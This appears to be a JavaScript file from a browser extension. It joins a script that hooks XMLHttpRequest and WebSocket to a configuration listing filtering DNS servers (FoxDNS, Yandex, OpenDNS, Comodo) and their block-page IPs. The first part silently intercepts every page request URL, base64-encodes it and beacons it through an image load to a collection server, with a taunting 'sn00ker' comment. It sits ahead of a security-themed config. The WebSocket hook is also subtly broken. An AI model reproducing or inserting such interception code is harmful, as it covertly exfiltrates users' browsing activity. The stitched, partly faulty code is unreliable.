function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
s3security.dns_servers = [
	{
		'name' : 'FoxDNS',
		'id' : 'fox_dns',
		'dns_ip' : ['89.33.7.212', '185.53.128.132'],
		'enabled' : true,
		'result_list' : [
			{ 'ip' : { '89.33.7.212' : true, '185.53.128.132' : true }, 'type' : 'adult' },
			{ 'ip' : { '89.33.7.211' : true, '185.53.128.131' : true }, 'type' : 'infected' },
			{ 'ip' : {}, 'type' : 'unknown_host' }
		]
	},
	{
		'name' : 'Yandex.DNS',
		'id' : 'yandex_dns',
		'dns_ip' : ['77.88.8.7', '77.88.8.3'],
		'enabled' : true,
		'result_list' : [
			{ 'ip' : { '93.158.134.250' : true }, 'type' : 'adult' },
			{ 'ip' : { '213.180.193.250' : true }, 'type' : 'infected' },
			{ 'ip' : {}, 'type' : 'unknown_host' }
		]
	},
	{
		'name' : 'OpenDNS',
		'id' : 'open_dns',
		'dns_ip' : ['208.67.222.123', '208.67.220.123'],
		'enabled' : true,
		'result_list' : [
			{ 'ip' : {
				'67.215.65.130' : true,
				'146.112.61.106' : true
				}, 
			'type' : 'adult' },
			{ 'ip' : {
				'146.112.61.104' : true,
				'146.112.61.105' : true,
				'146.112.61.107' : true,
				'146.112.61.108' : true,
				'146.112.61.109' : true,
				'146.112.61.110' : true
				}, 
			'type' : 'infected' },
			{ 'ip' : {}, 'type' : 'unknown_host' }
		]
	},
	{
		'name' : 'Comodo DNS',
		'id' : 'comodo_dns',
		'dns_ip' : ['8.26.56.26', '8.20.247.20'],
		'enabled' : true,
		'result_list' : [
			{ 'ip' : {}, 'type' : 'adult' },
			{ 'ip' : { '174.129.145.134' : true }, 'type' : 'infected' },
			{ 'ip' : { '92.242.144.50' : true }, 'type' : 'unknown_host' }
		]
	}
];
//---------------------------------------------------------------------------------
